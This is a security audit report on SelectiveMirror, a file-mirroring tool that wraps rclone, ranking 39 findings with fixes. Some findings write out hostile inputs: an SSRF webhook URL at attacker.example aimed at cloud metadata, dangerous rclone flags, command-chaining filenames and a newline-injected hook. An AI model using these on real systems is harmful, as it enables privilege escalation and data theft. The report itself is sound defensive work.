# SelectiveMirror — Security Audit Report

**Date**: 2026-04-18
**Audited version**: `0.8.42-dev` (`cmd/smirror/main.go:43`)
**Audit type**: Adversarial security review (offensive perspective)
**Method**: Read-only static analysis across 6 attack surfaces in parallel, plus targeted code-path verification

---

## Re-verification of previous fixes

| ID | Status | Notes |
|----|--------|-------|
| BUG-01 (hooks test) | PARTIAL | All 535 tests pass. Test now uses `New(30 * time.Second)` — wall-clock raised, but **still timeout-based**. Violates user preference (event-based sync via channels/WaitGroups). |
| DOC-01 (versions) | PARTIAL | CLAUDE.md fixed; CHANGELOG.md still tops at v0.7.0 (no 0.8.x entry) |
| DOC-02 (deps) | FIXED | CLAUDE.md and CREDITS.md updated |
| DOC-03 (delete_policy) | FIXED | comment now says `delete (default)` |
| DOC-04 (phase status) | FIXED | Phase 6, 7 marked complete |
| DOC-05 (missing pkgs) | FIXED | anomaly, hooks, telemetry now listed |
| DOC-06 (race lists) | FIXED | CI and CONTRIBUTING aligned |
| DOC-07 (coverage gate) | FIXED | VV-Plan strikethrough applied |
| DOC-08 (test counts) | PARTIAL | CLAUDE.md/CONTRIBUTING.md updated to 530+; SRS line 495 still says 287; VV-Plan line 247 still says 287; story.md still has stale 392 references |
| DOC-09 (.golangci.yml) | UPDATED | comment now reflects current values |
| DOC-10 (syncnow alias) | FIXED | now documented |
| DOC-11 (exit code 6) | NOT FIXED | still undocumented in user-facing docs |
| DOC-12 (go-humanize) | FIXED | listed in CREDITS.md |
| LINT-01 (CloseHandle) | FIXED | explicit `_ = ` discard |
| LINT-02 (cmdStatus complexity) | NOT FIXED | now 64 (worse); threshold raised to 50 instead of refactored |
| LINT-03 (cmdAddMirror complexity) | NOT FIXED | still 52, above threshold |
| LINT-04 (TrimPrefix) | FIXED | uses `strings.TrimPrefix` |
| LINT-05 (EqualFold) | FIXED | uses `strings.EqualFold` |

**Build/vet/test status**:
- `go build ./cmd/smirror/`: PASS
- `go vet ./...`: PASS
- `go test ./internal/... ./cmd/...`: 535 pass, 0 fail, 35.2% coverage
- `golangci-lint`: 2 gocyclo warnings remain (non-blocking)

---

## Security Audit Summary

**Total findings: 39** across 6 attack surfaces.

| Severity | Count | Examples |
|----------|-------|----------|
| **CRITICAL** | 5 | Supply-chain dependency, MSI privilege gap, hook injection, webhook sanitizer missing in service mode, webhook SSRF |
| **HIGH** | 11 | rclone flag injection, rclone_path hijack, copyto TOCTOU, code-signing absent, junction not rejected, ACL claims false on Windows, etc. |
| **MEDIUM** | 16 | Path traversal corners, log leaks, anomaly sanitizer gaps, downgrade attacks, DoS vectors |
| **LOW** | 5 | Minor info disclosure, polish items |
| **INFO** | 2 | Documentation gaps |

---

# CRITICAL FINDINGS

## SEC-C1 — Supply-chain risk: `git-pkgs/gitignore` is a 2-month-old, 1-star republish of a well-known package

- **File**: `go.mod:7`
- **Current**: `github.com/git-pkgs/gitignore v1.1.1`
- **Expected**: `github.com/sabhiram/go-gitignore` (the canonical package: created 2015, 162 stars, 37 forks, MIT, audited by countless projects)
- **Evidence**:
  - GitHub API check on `git-pkgs/gitignore`: created 2026-02-09, 1 star, 0 forks
  - Owner org `git-pkgs` created 2026-01-13 with description "Dependency tools for git" and blog `git-pkgs.dev`
  - This is a textbook **dependency-confusion / typosquatting / supply-chain attack pattern**: fresh GitHub org publishing forks of well-known packages under their own import path
- **Why this is critical**: This package implements `.syncignore` pattern matching that runs on **every file event**. A malicious version (push v1.1.2 tomorrow, anyone running `go get -u` pulls it) could:
  - Exfiltrate file paths via DNS or out-of-band channels
  - Bypass excludes for sentinel filenames (e.g., `.env`, private keys) → secrets uploaded to remote
  - Drop a payload when matching specific patterns
- **Fix**: Replace import with `github.com/sabhiram/go-gitignore`. Run `go mod tidy`. Audit the diff between the current `git-pkgs` v1.1.1 and `sabhiram` upstream — there may already be malicious changes.

## SEC-C2 — WiX MSI installs SYSTEM service into user-writable `%LOCALAPPDATA%\SelectiveMirror`

- **File**: `installer/Package.wxs:11, 28-30, 87-92`
- **Issue**: The MSI declares `Scope="perUser"` and installs `smirror.exe` into `LocalAppDataFolder` (user-writable). When elevated, it then registers `smirror.exe service install` which creates a Windows service running as **LocalSystem**.
- **Exploit (LPE)**:
  1. User runs `SelectiveMirror.msi`, accepts UAC
  2. `smirror.exe` lands in `C:\Users\victim\AppData\Local\SelectiveMirror\smirror.exe`
  3. Service registered with `binPath = "C:\Users\victim\AppData\Local\SelectiveMirror\smirror.exe"` running as LocalSystem
  4. **Victim (or any process running as victim, including malware)** overwrites `smirror.exe` with a trojan
  5. Next reboot or `sc start SelectiveMirror`: trojan runs as LocalSystem → full machine takeover
- **Severity**: Critical — textbook privilege escalation. Local user → SYSTEM in seconds.
- **Fix**: Switch to `Scope="perMachine"` + `ProgramFiles64Folder` with admin-only ACLs. Or refuse `service install` when `os.Executable()` resides in a non-admin-protected directory.

## SEC-C3 — Webhook payload sanitizer NOT applied in service mode (info disclosure)

- **File**: `cmd/smirror/main.go:2896-2908` vs `main.go:538-551`
- **Verified myself**: Foreground mode at line 541 sets `webhookSender.SanitizePath = anomaly.SanitizePath`. Service mode at line 2898 **does not**. They are otherwise identical.
- **Impact**: Production deployments (Windows service) POST anomaly alerts containing **raw absolute paths** including:
  - `C:\Users\<username>\OneDrive - Acme Corp\client-projects\...`
  - UNC paths revealing internal share names
  - Project layout that leaks customer/personal identifiers
- **Fix** (one line): Add `webhookSender.SanitizePath = anomaly.SanitizePath` after line 2898.

## SEC-C4 — `alert_webhook_url` is unrestricted SSRF + accepts plaintext HTTP

- **Files**: `internal/notify/webhook.go:71-81, 257-258, 252`; `internal/config/config.go:109` (no validation in `Validate()`)
- **Issues** (compounded):
  - No scheme allowlist → `http://` accepted (cleartext credential/path exfil on the wire)
  - No host allowlist → `http://169.254.169.254/latest/meta-data/iam/...` (AWS metadata), `http://localhost:6379/` (Redis raw protocol smuggling), `http://[::1]:9200/_cluster/state` (Elasticsearch) all reachable
  - No `CheckRedirect` policy → 10 cross-host redirects followed (Go default) → SSRF defenses trivially bypassed
  - No DNS-rebinding defense (single resolve, can switch to internal IP between resolves)
  - No HMAC/signing → receiver cannot distinguish smirror traffic from spoofed POSTs
- **Exploit**: Set `alert_webhook_url: http://attacker.example/start` → attacker's server returns `302 Location: http://169.254.169.254/...` → smirror (running as LocalSystem) POSTs internal metadata to attacker
- **Fix**:
  - In `Validate()`: parse via `url.Parse`, require `https://` (or `http://127.0.0.1` only with explicit opt-in), reject RFC1918/loopback/link-local
  - Set `client.CheckRedirect = func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }` (or re-validate per hop)
  - Add custom `Transport.DialContext` that re-resolves and re-checks each connection (DNS rebind defense)
  - Add optional `webhook_secret` config field; emit `X-Smirror-Signature: sha256=hmac(body, secret)`

## SEC-C5 — Hook injection via attacker-controlled config + filename interpolation

- **Files**: `internal/hooks/hooks.go:46-67`, `internal/sync/sync.go:188-217`, `internal/config/config.go` (no permission check on config load)
- **Two stacked issues**:

  **A) Config-as-code under LocalSystem**: Hooks (`pre_sync_hook`, `post_sync_hook`) execute via `cmd.exe /C <hookCmd>` (Windows) or `sh -c <hookCmd>` (Unix). When the service runs as LocalSystem and the config file lives in a user-writable location (`%USERPROFILE%\.selectivemirror\config.yaml`), **any user who can edit config.yaml gets LocalSystem RCE on the next file event**.

  - SECURITY.md *says* "Restrict config.yaml to 0600" but the code never validates this. There is no owner check, no DACL inspection, no warning.
  - On Windows, `os.Chmod(0600)` is a no-op. The file inherits parent dir DACL.

  **B) Filename → env var → shell expansion**: Env vars are passed correctly via `cmd.Env` (array, not concatenated) — so the filename itself can't directly inject. **But** users typically write hooks like `echo Synced: %SMIRROR_FILE%` (Windows) or `echo "Synced: $SMIRROR_FILE"` (Unix). On Windows, `cmd.exe` expands `%SMIRROR_FILE%` *after* parsing — a filename literally named `a&calc.exe` (Windows allows `&` in filenames) chains commands. On Unix, an unquoted `$SMIRROR_FILE` containing `$(...)` or backticks does the same.

- **Fix**:
  - When loading config under a service account: verify file owner is `BUILTIN\Administrators` or `NT AUTHORITY\SYSTEM`; verify DACL has no write ACE for non-administrators on the file *and every parent directory*
  - Hard-fail if hooks are present in a config not protected this way
  - Document explicitly in SECURITY.md that hook authors must quote env-var expansions; consider validating filenames don't contain `&|<>"^` before queuing

---

# HIGH FINDINGS

## SEC-H1 — `rclone_extra_flags` allows arbitrary rclone control via flags

- **File**: `internal/sync/sync.go:759-788, 770-771`; config validation absent
- **Issue**: `rclone_extra_flags: []string` is appended unfiltered to every rclone invocation. rclone has many flags with dangerous semantics:
  - `--rc --rc-addr 0.0.0.0:5572 --rc-no-auth` — opens an unauthenticated remote-control HTTP server (full filesystem access as service account)
  - `--log-file C:\Windows\System32\drivers\etc\hosts` — file overwrite as LocalSystem
  - `--config C:\attacker\rclone.conf` — swaps the entire remote config
  - `--drive-impersonate attacker@victim.com` — Google Workspace impersonation
- **Fix**: Allowlist a known-safe subset of flags (`--transfers`, `--bwlimit`, `--drive-chunk-size`, `--fast-list`, etc.); reject anything starting with `--rc`, `--log-file`, `--config`, `--script-*`, `--drive-impersonate`, `--drive-service-account-*`

## SEC-H2 — `rclone_path` is arbitrary binary; PATH-relative resolution is hijackable

- **Files**: `internal/config/config.go:95, 371-379`; `internal/sync/sync.go:782`
- **Issue**: Validation only stats the file (exists, not a dir). No signature check, no allowlist, no requirement for absolute path. When `rclone_path: "rclone"` (default), `exec.LookPath` resolves via PATH. In a Windows service context, PATH may include user-writable directories.
- **Exploit**: Set `rclone_path: C:\Users\victim\Downloads\evil.exe` OR drop `rclone.exe` somewhere earlier in service PATH → LocalSystem RCE
- **Fix**: Require absolute path when set; verify the binary directory is admin-only ACL; signature-check (WinVerifyTrust) on Windows in service mode

## SEC-H3 — `copyto` TOCTOU: source path not re-checked after quiescence

- **File**: `internal/sync/sync.go:303, 389`; quiescence in `quiesceFile` at line 224-293
- **Issue**: `quiesceFile` calls `os.Lstat` and follows `EvalSymlinks` to validate target, returns `readPath`. But `syncSingleFile` builds `localPath := filepath.Join(proj.LocalPath, relPath)` and passes that to `rclone copyto` — **not the resolved path**. Between quiescence check and rclone fork, an attacker with mirror-write access can swap the regular file for a symlink to a sensitive target.
- **Why `--skip-links` doesn't save us**: per rclone docs, `--skip-links` only affects directory listing, not direct `copyto SRC DST`. `copyto` will follow the symlink and upload the target's bytes.
- **Fix**: Either pass the resolved `readPath` to rclone, or `os.Lstat(localPath)` immediately before the subprocess fork and bail if it's a symlink.

## SEC-H4 — NTFS junctions/reparse points bypass the watcher's symlink rejection

- **Files**: `internal/watcher/watcher.go:259, 665`; `cmd/smirror/main.go:342-379` (validateProject)
- **Issue**: Symlink rejection uses `d.Type() & os.ModeSymlink`. NTFS junctions surface as `os.ModeIrregular`, not `ModeSymlink`. They pass `IsDir()` and are accepted. On Windows, `ReadDirectoryChangesW` with `bWatchSubtree=TRUE` follows junctions into target filesystems.
- **Exploit**: User creates `C:\Mirror\escape` as a junction to `C:\Windows` via `mklink /J`. Watcher recurses into Windows files; sync uploads them as part of the mirror.
- **Mirror root case**: `smirror addmirror C:\Junk` where `C:\Junk` is `mklink /J C:\Junk C:\Users\Other\Documents` mirrors another user's docs — `validateProject` doesn't detect this.
- **Fix**: Treat `ModeIrregular` (and Windows reparse-point attribute) the same as `ModeSymlink` in `addRecursive` and `queueFilesInDir`. In `validateProject`, reject when `resolveRealPath(local_path)` differs from supplied path.

## SEC-H5 — Symlink-to-file is followed and its target uploaded (LocalSystem reads any file)

- **Files**: `internal/watcher/watcher.go:410-417`, `internal/sync/sync.go:244-261`
- **Issue**: Per FR-WATCH-06 ("Resolve symlink-to-file targets on startup"), symlink-to-file is *intended* behavior. But under LocalSystem, this means **any file SYSTEM can read** (e.g., `C:\Windows\System32\config\SAM`, other users' files) is exfiltrated to the attacker-controlled remote when an attacker plants a symlink in a user-writable mirror.
- **Fix**: Default-reject symlink-to-file in service mode; require explicit `allow_symlink_files: true` per mirror. Drop link resolution in the single-file `copyto` path.

## SEC-H6 — `os.Chmod(0600)` is a no-op on Windows; SECURITY.md "owner-only 0600" claim is false

- **Files**: `internal/anomaly/writer.go:83`, `internal/metrics/metrics.go:250`, `internal/logging/open_windows.go`, `internal/lock/lock.go:38, 76`, `internal/state/state.go:110`
- **Issue**: On Windows, Go's `os.OpenFile(..., 0600)` ignores POSIX bits. Files inherit parent directory DACL. `~/.selectivemirror/` is created with `os.MkdirAll(..., 0755)` — same parent-DACL inheritance. The "owner-only" claim in SECURITY.md is materially false on Windows.
- **Additional**: `open_windows.go:17-25` opens log file with `FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE` — explicitly allows other processes to delete log mid-write.
- **Fix**: On Windows, build explicit DACL via `windows.SECURITY_ATTRIBUTES` granting only SYSTEM + Administrators. Drop `FILE_SHARE_WRITE|FILE_SHARE_DELETE` from log handle in service mode.

## SEC-H7 — State DB / config / log opened without symlink rejection

- **Files**: `internal/state/state.go:108-114`; `internal/logging/open_windows.go`; `internal/config/config.go:252`
- **Issue**: `sql.Open`, log open via `CreateFile(OPEN_ALWAYS)`, and `os.ReadFile` for config don't check for reparse points. Attacker plants `~/.selectivemirror/state.db` as a symlink/junction to `C:\Windows\System32\drivers\etc\hosts` *before* smirror (as SYSTEM) starts. SQLite opens, writes WAL/SHM sidecars → corrupts target.
- **Fix**: At startup, `os.Lstat` each sensitive path, refuse if symlink/junction. On Windows use `CreateFile(..., FILE_FLAG_OPEN_REPARSE_POINT)` and reject reparse-point attribute.

## SEC-H8 — Self-update binary is not code-signed; checksum-only verification

- **Files**: `cmd/smirror/selfupdate.go:373-413, 392-403`; `.goreleaser.yaml` (no `signs:` stanza); `release.yml` (no signtool step for MSI)
- **Issues**:
  - SHA256 verification only; **no GPG/cosign/Authenticode signature**
  - Both binary and `checksums.txt` come from same release URL — single-point compromise
  - If checksum download fails, install proceeds **with no verification** (fails open at `selfupdate.go:392-403`)
  - MSI is not Authenticode signed → SmartScreen warns; MITM substitutions undetectable
- **Exploit**: GitHub account compromise OR malicious release-asset reupload (releases are mutable for repo owners) → all installations auto-install malware on next selfupdate
- **Fix**: Add GoReleaser `signs:` with cosign keyless or minisign. Embed verifier public key. Make checksum verification mandatory when asset is listed. Sign the MSI in `release.yml`.

## SEC-H9 — rclone full-argument logging leaks remote paths and rclone.conf path

- **File**: `internal/sync/sync.go:790, 811`
- **Issue**:
  - L790: `e.log.Debug("rclone", "cmd", rclonePath, "args", strings.Join(args, " "))` — `args` always begins with `--config <path>` and includes the remote path (`gdrive:Foo/Bar/secret.txt`)
  - L811: on rclone timeout, `args` is logged at **Error level** (default log level) — verbatim
- **Exploit**: User shares debug log when troubleshooting → reveals rclone.conf path (one ACL away from OAuth tokens), all remote paths, all synced absolute paths
- **Fix**: Strip `--config <path>`; redact remote paths to `<remote>:<REDACTED>`; redact home prefix.

## SEC-H10 — rclone stderr logged verbatim — may contain OAuth tokens, signed URLs

- **File**: `internal/sync/sync.go:809-829`
- **Issue**: `stderrBuf` captured then logged via slog at Warn/Error with `"stderr", stderrMsg`. rclone error messages can include:
  - Bearer-token-bearing URLs: `Failed to copy: googleapi: Error 401: ...token=ya29...`
  - S3 STS tokens in retried error chains
  - Server-side redirect URLs / pre-signed URLs (`?X-Amz-Signature=...`)
  - Refresh token URLs, JWT-shaped strings
- **Exploit**: Sync failure → stderr containing token-URL is persisted in `selectivemirror.log` (open with `FILE_SHARE_READ` — any local user can `Get-Content -Wait`). Token replay until expiry.
- **Fix**: Run stderr through regex redactor before logging — patterns matching `Authorization:\s*\S+`, `[?&](token|access_token|signature|X-Amz-Signature)=[^&\s]+`, JWT shapes, absolute paths.

## SEC-H11 — `install-rclone.ps1` downloads rclone with NO hash verification

- **File**: `installer/install-rclone.ps1:77-84`
- **Issue**: Fallback path uses `Invoke-WebRequest -Uri https://downloads.rclone.org/rclone-current-windows-amd64.zip` and extracts into `$env:ProgramFiles\rclone`. **No SHA256 verification.** Trusts entire HTTPS chain + DNS for `downloads.rclone.org`.
- **Exploit**: Compromise of rclone download server, DNS hijack, or state-level MITM with CA-signed cert → malicious `rclone.exe` in Program Files → executed by smirror on every sync (sometimes elevated)
- **Fix**: Pin rclone version. Fetch published `SHA256SUMS` from rclone.org over HTTPS, verify before extract.

---

# MEDIUM FINDINGS

## SEC-M1 — `crashreport.go:175` uses `cmd /c start <URL>` — bypasses the safer `openBrowserURL` helper that exists for this exact reason

- **Issue**: `_ = exec.Command("cmd", "/c", "start", fullURL).Start()` — `start` treats `&` in URL as command chain separator. The `crashURL` literally contains `&title=...` (separator not encoded). On older `cmd.exe` versions, embedded `&` chains commands.
- **Fix**: Replace with the existing `openBrowserURL` helper at `main.go:1914` — it uses `rundll32 url.dll,FileProtocolHandler` precisely to avoid this bug (per the comment there).

## SEC-M2 — Telemetry "BackendTypes" leaks user-defined remote names, not backend types

- **File**: `internal/telemetry/telemetry.go:230-244`, doc lines 12-15
- **Issue**: Docstring claims it returns "backend types like 'gdrive', 's3'" with "ZERO PII". In reality, `ExtractBackendTypes` returns the prefix before `:` of each `Remote` value, which is the **user-defined rclone remote name** (e.g., `acmecorp-prod-drive`, `client-ABCD-bucket`). These names commonly carry company/customer/personal markers.
- **Combined with `InstallID`** (stable 128-bit per-install identifier sent hourly) + `OSDetail` + exact byte/file counts → behavioral fingerprint that fully de-anonymizes users.
- **Fix**: Either parse rclone.conf for the actual `[remote] type = X`, hash names with per-install salt, or drop the field.

## SEC-M3 — Per-mirror `rclone_config` path hijack in service mode

- **File**: `internal/config/config.go:96, 121-128`
- **Issue**: `RcloneConfig` is prepended via `--config` to every rclone command. No path validation. With config tampering (SEC-C5), attacker sets `rclone_config: C:\Users\attacker\evil.conf` containing arbitrary remote definitions (e.g., a `[local]` remote rooted at `C:\Windows\System32\config`).
- **Fix**: When in service mode, refuse `rclone_config` paths outside admin-protected directories.

## SEC-M4 — `report-bug` log inclusion only sanitizes home dir — doesn't redact rclone tokens, UNC, signed URLs

- **File**: `cmd/smirror/main.go:2024-2068, 2111-2141`
- **Issue**: Last 30 log lines dumped into report. Post-pass replaces home dir with `~`. Doesn't redact:
  - `--config <path>` segments from rclone arg lines
  - rclone stderr containing tokens/signed URLs (SEC-H10)
  - `remote_path=gdrive:...` slog kv occurrences in log lines
  - UNC paths `\\server\share\...`
  - `instance_user` strings (domain\user)
- **Plus M4b**: `report-bug --open` puts up to 8KB of report content in URL query string → persisted in browser history, browser sync (cross-device), DNS query logs, process command line of `cmd /c start <url>` (visible in Process Explorer)
- **Fix**: Real redactor (regex for tokens, signed URLs, IPs, UNC) on `report` before output. Use clipboard or `gh issue create --body-file` instead of URL params.

## SEC-M5 — Anomaly path sanitizer only handles home dir; misses UNC/long/multi-drive/multi-user

- **File**: `internal/anomaly/sanitize.go:11-26`
- **Misses**:
  - UNC paths `\\server\share\...`
  - Long paths `\\?\C:\very\long\path`
  - Other-drive project paths (`D:\...`, `C:\Orch`, `C:\HPL` per CLAUDE.md — these mirrors are NOT under home)
  - Other users: `C:\Users\victim\...` when running as SYSTEM
  - OneDrive cloud-storage redirects: home prefix removed but `OneDrive - Acme Corp` company name remains
- **Fix**: Sanitize all configured project LocalPath prefixes. Redact UNC `\\*` patterns. Replace `[A-Z]:\Users\[^\]+` to redact other usernames.

## SEC-M6 — YAML config edit non-atomic + injection via mirror name with newline

- **Files**: `internal/config/edit.go:54, 133, 189, 194-225`; `cmd/smirror/cmdaddmirror.go:147-160`
- **Two issues**:
  - `os.WriteFile` (no temp + rename) → crash mid-write corrupts config → service won't start (DoS)
  - `formatMirrorBlock` writes `name`/`local_path` without YAML quoting (line 196-197). NTFS allows `\n` (0x0A) in directory names. Attacker creates `C:\Projects\Foo\n    pre_sync_hook: "calc.exe"\n  - name: Bar` — `addmirror` injects a `pre_sync_hook` line into config → executes on next sync as service account
- **Fix**: Use `yaml.Marshal` to serialize the project struct (escapes correctly). Write atomically: `WriteFile(path+".tmp")` + `Rename`.

## SEC-M7 — State DB foreign-write trust bypass (no integrity check)

- **File**: `internal/state/state.go:204-227`
- **Issue**: `GetFileState` returns stored hash. Sync engine compares to `HashFile()` output — if match, skip upload. Attacker who can write `state.db` directly (same-user filesystem ACL) sets `local_hash = HashFile(malicious_file)` → smirror believes the file is "already synced" → never uploads, leaving stale-but-different remote copy.
- **Inverse**: Mark all rows `synced_at=<future>, rclone_exit=0` to suppress reconciliation indefinitely.
- **Fix**: HMAC-sign rows with a key in DPAPI/keystore. Or document threat model: "state.db trust = user-account trust". Add forced-rehash mode for `test-mirrors`.
- **Status (2026-04-29)**: **DEFERRED to dedicated security session.** The threat model is unclear without a deliberate decision — defending against an offline attacker with disk write access is a different problem from cross-binary trust (already partially covered by GAP-7 schema-version refusal in 0.9.21-dev). The fix space (HMAC-key-storage choice, schema migration, performance impact of per-row HMAC) is too large for a drive-by patch. Tracking deferral in CHANGELOG; will be revisited in a focused security review with an articulated threat model.

## SEC-M8 — Quarantine timestamp is second-resolution → collision overwrites

- **File**: `internal/sync/sync.go:653-672`
- **Issue**: `quarantinePath := proj.Remote + "/.quarantine/" + filepath.ToSlash(relPath) + "." + ts` where `ts` uses `20060102T150405Z` (one-second resolution). Two deletes of the same path within the same UTC second → collision. On Google Drive: silent overwrite. Plus no size cap on quarantine — script can fill remote disk via rapid create/delete loop.
- **Fix**: Append nanoseconds + random suffix. Add `quarantine_max_size_mb` config.

## SEC-M9 — `recordUpdateTime` ignores all errors → 24h selfupdate rate-limit can be bypassed

- **File**: `cmd/smirror/selfupdate.go:594-606, 611-649`
- **Issue**: `_ = st.SetMeta(...)` silently swallows DB-locked errors. If never recorded, `checkForUpdateOnStartup` re-checks every startup. Combined with downgrade attack (no version floor), enables forced repeated update attempts.
- **Fix**: Bubble up errors; log them; still record success on retry.

## SEC-M10 — Self-update has no downgrade protection

- **File**: `cmd/smirror/selfupdate.go:120`
- **Issue**: Compares versions but doesn't store "highest installed version". Compromised owner publishes old vulnerable v0.8.5 as "latest" → `CompareVersions(latest, current) > 0` ⇒ install proceeds.
- **Fix**: Persist `last_installed_version` in state DB. Reject any update where `CompareVersions(latest, last_installed_max) < 0` unless `--allow-downgrade`.

## SEC-M11 — Webhook redirect-following cap missing

- **File**: `internal/notify/webhook.go:71-81`
- **Issue**: `&http.Client{Timeout: 5*time.Second}` — no `CheckRedirect`. Default 10 redirects across hosts/schemes → SSRF defenses bypassed via attacker-controlled bouncer.
- **Fix**: `client.CheckRedirect = func(...) error { return http.ErrUseLastResponse }` or per-hop SSRF re-check.

## SEC-M12 — FairQueue is unbounded; "natural dedup bound" is not a bound

- **File**: `internal/sync/fairqueue.go:36-41, 110-127`; `internal/sync/sync.go:83`
- **Issue**: `NewFairQueue(0, 30*time.Second)` — `maxSize=0` means unbounded. Dedup key is full path; with 10M unique paths → 5–10 GB RAM (each Task carries full `config.Project` value). 50K overflow callback only triggers reconciliation, doesn't shed load.
- **Fix**: Hard cap maxSize. On overflow: block enqueues with metric, persist to disk, or reject and rely on reconciliation.

## SEC-M13 — Recursive symlink/junction loop is NOT defended on Windows

- **File**: `internal/watcher/recurse_windows.go`; `internal/watcher/watcher.go:649`
- **Issue**: `enableRecurse=true` so fsnotify uses kernel-level subtree watching. The kernel itself follows reparse points/junctions. `queueFilesInDir` uses `filepath.WalkDir` which has no inode/junction loop detection.
- **Exploit**: `mklink /J C:\Mirror\child C:\Mirror` → infinite WalkDir → stack overflow / amplification storm
- **Fix**: Track visited paths via canonicalized path set; enforce depth cap.

## SEC-M14 — Hook timeout doesn't kill grandchildren (orphan process accumulation)

- **File**: `internal/hooks/hooks.go:51-69`
- **Issue**: `exec.CommandContext` only signals the immediate `cmd.exe` (or `sh`). Hook contains `start /B notepad.exe` → `cmd.exe` exits, `notepad.exe` lives forever.
- **Impact**: Across thousands of sync events, hook grandchildren accumulate → handle/PID exhaustion.
- **Fix**: Windows: Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`. Unix: `Setpgid: true` + `syscall.Kill(-pgid, SIGKILL)`.

## SEC-M15 — `ListRemote` loads entire `lsjson` output into memory

- **File**: `internal/sync/sync.go:1393-1402`
- **Issue**: `cmd.Output()` buffers entire `rclone lsjson --recursive --hash` then `json.Unmarshal` parses whole. 10M files × ~300B = 3 GB stdout, 6+ GB after unmarshal → OOM during reconciliation.
- **Fix**: Stream via `cmd.StdoutPipe()` + `json.Decoder` token loop.

## SEC-M16 — `gh auth token` PATH hijack — leaks user's GitHub token to attacker-planted gh.exe

- **File**: `internal/telemetry/telemetry.go:208`
- **Issue**: `exec.CommandContext(ctx, "gh", "auth", "token")` resolves via PATH. If attacker plants `gh.exe` in a directory earlier in PATH (e.g., the SelectiveMirror INSTALLFOLDER, see SEC-C2), they capture the user's GitHub token (often repo-write scope).
- **Fix candidates**:
  - (a) Drop `gh` integration entirely — use unauthenticated GitHub API calls (60 req/hr per IP is enough for our few selfupdate calls).
  - (b) Refuse to use `gh` unless its absolute path is configured in `config.yaml` (admin-owned in service mode). UX-bad: users would have to set this.
  - (c) Verify `gh.exe` Authenticode signature is GitHub's before invoking.
- **Status (2026-04-29)**: **DEFERRED to dedicated security session.** No clearly-best fix without a UX/security trade-off conversation. (a) is simplest but loses dupsearch's authenticated rate limit; (b) is most secure but breaks zero-config UX; (c) is most expensive to maintain. Tracking deferral in CHANGELOG.

---

# LOW FINDINGS

## SEC-L1 — Strict YAML mode silently downgrades on unknown fields
`internal/config/config.go:284-297` — falls back to non-strict on "not found" errors. Misconfigured key (typo or forward-spelling) is accepted with stderr warning that service operators rarely see.

## SEC-L2 — Lock file mode 0644 (Unix); Windows defaults
`internal/lock/lock.go:38, 76` — should be 0600 / admin-only ACL.

## SEC-L3 — Notifier toast messages include file path & exit code
`internal/notify/notify.go:68-92` — visible to shoulder-surfing, screen recording, Windows Action Center, Windows 11 Recall. Should include only project name.

## SEC-L4 — Status.json `LastError` includes raw relPath unsanitized
`internal/metrics/metrics.go:236-258`, `internal/sync/sync.go:438` — `fmt.Sprintf("rclone exit %d for %s", exitCode, relPath)`.

## SEC-L5 — Webhook URL itself logged on delivery failure (may contain query-string token)
`internal/notify/webhook.go:262, 268` — `w.log.Warn(... "url", w.url, ...)`. If webhook uses `?token=...`, the secret persists in log file.

---

# INFO

## SEC-I1 — SECURITY.md claim "0600 owner-only" is materially false on Windows
See SEC-H6 above. Update SECURITY.md to accurately describe Windows permissions, or implement actual Windows ACL hardening.

## SEC-I2 — `cmdStatus` complexity threshold raised (50→64) instead of refactored
This isn't security per se, but a 64-CCN function is hard to audit. Function decomposition would reduce future bug risk.

---

# Top 10 Fix Priorities (Ranked by Risk × Effort)

| # | ID | What | Effort | Impact |
|---|----|------|--------|--------|
| 1 | SEC-C1 | Replace `git-pkgs/gitignore` → `sabhiram/go-gitignore`. Audit diff. | 1-line + audit | Removes biggest unknown supply-chain risk |
| 2 | SEC-C3 | Add `webhookSender.SanitizePath = anomaly.SanitizePath` after main.go:2898 | 1 line | Stops production paths leaking to webhooks |
| 3 | SEC-C2 | WiX MSI: switch `Scope="perUser"` → `perMachine` + `ProgramFiles64Folder` | Small | Eliminates LPE via binary-replace |
| 4 | SEC-C4 | Validate `alert_webhook_url`: scheme allowlist + IP allowlist + redirect cap + DNS rebind defense | Small-medium | Blocks SSRF + cleartext exfil |
| 5 | SEC-C5 | Verify config file ACLs on load when running as service. Refuse to run hooks if config is non-admin-writable | Medium | Stops "config = LocalSystem RCE" pattern |
| 6 | SEC-H1+H2 | Allowlist `rclone_extra_flags`; require absolute `rclone_path`; signature-check binary in service mode | Small-medium | Closes flag-injection LPE |
| 7 | SEC-H3+H4+H5 | TOCTOU fix on `copyto` source; reject NTFS junctions; default-reject symlink-to-file in service mode | Medium | Closes symlink/junction exfil + privilege chain |
| 8 | SEC-H6+H7 | Real Windows ACLs (SYSTEM + Administrators only) on data dir + sensitive files; reject reparse points at startup | Medium | Makes SECURITY.md claims true |
| 9 | SEC-H8+SEC-H11 | Cosign or minisign for releases; sign MSI; SHA256-verify rclone download in install-rclone.ps1 | Medium | Closes supply-chain MITM |
| 10 | SEC-H9+H10+M4+M5 | Real redactor (regex over tokens, signed URLs, UNC, OneDrive corp prefix, multi-user) before any log/webhook/report write | Medium | Stops widespread info disclosure |

---

# What Was Tested But Cleared

- `go vet ./...`: clean
- SQL injection: all 14 SQL statements use `?` parameters; clean
- TLS verification on webhook/selfupdate: uses default `http.Client` (no `InsecureSkipVerify`); clean
- YAML deserialization (RCE): `go.yaml.in/yaml/v3 v3.0.4` has no known unmarshal RCE; alias-bombing capped internally; clean
- Decompression bomb in selfupdate: 200MB cap via `LimitReader+1`; clean
- `Global\SmirrorSyncNow` event DACL: SDDL is SYSTEM + Administrators only despite a stale comment
- Service uninstall admin gate: `IsInstalled() && !isAdmin()` exits early; clean
- CI secret exposure on PRs: `release.yml` triggers only on `tags: ['v*']`; PRs cannot exfiltrate; clean
- Default `http.Transport` blocks `file://` and `gopher://`; only http/https reachable via webhook
- Filter pattern parse errors fail closed (HasBadPatterns blocks batch sync); clean
